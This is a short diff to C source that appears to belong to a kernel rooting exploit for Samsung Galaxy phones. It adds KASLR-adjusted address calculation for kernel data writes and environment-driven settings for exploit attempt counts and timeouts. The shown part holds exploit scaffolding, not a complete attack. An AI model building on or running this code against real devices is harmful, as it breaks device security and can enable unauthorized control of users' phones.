@@ -91,7 +91,45 @@ uintptr_t p0_data_alias(uintptr_t image_addr) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
+#if APP_TRACEFS_PHYS_ALIAS_DATA
+  /* h8q: slide and data addressing are intentionally separated — kernel
+   * DATA writes go through the physical-load alias, not the canonical
+   * direct map derived from the Tracefs slide. */
   return p0_data_alias(image_addr) + kaslr_slide;
+#else
+  return p0_data_alias(image_addr) + kaslr_slide;
+#endif
+}
+
+/* --- Root-My-Galaxy route policy (feed-defined, delivered via env) --- */
+int g_exploit_attempts = POLICY_DEFAULT_ATTEMPTS;
+int g_attempt_timeout_sec = POLICY_DEFAULT_ATTEMPT_TIMEOUT_SEC;
+int g_p0_timeout_sec = POLICY_DEFAULT_P0_TIMEOUT_SEC;
+
+static int policy_env_int(const char *name, int fallback, int lo, int hi) {
+  const char *s = getenv(name);
+  if (!s || !*s)
+    return fallback;
+  char *end = NULL;
+  errno = 0;
+  long v = strtol(s, &end, 0);
+  if (errno || end == s || *end || v < lo || v > hi) {
+    pr_warning("policy: ignoring invalid %s=%s\n", name, s);
+    return fallback;
+  }
+  return (int)v;
+}
+
+void policy_init_from_env(void) {
+  g_exploit_attempts =
+      policy_env_int("EXPLOIT_ATTEMPTS", POLICY_DEFAULT_ATTEMPTS, 1, 64);
+  g_attempt_timeout_sec = policy_env_int(
+      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", POLICY_DEFAULT_ATTEMPT_TIMEOUT_SEC, 1, 3600);
+  g_p0_timeout_sec = policy_env_int(
+      "P0_ATTEMPT_TIMEOUT_SEC", POLICY_DEFAULT_P0_TIMEOUT_SEC, 1, 3600);
+  pr_info("policy: attempts=%d attempt_timeout=%ds p0_timeout=%ds budget=%d\n",
+      g_exploit_attempts, g_attempt_timeout_sec, g_p0_timeout_sec,
+      APP_FOPS_RETRY_BUDGET);
 }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
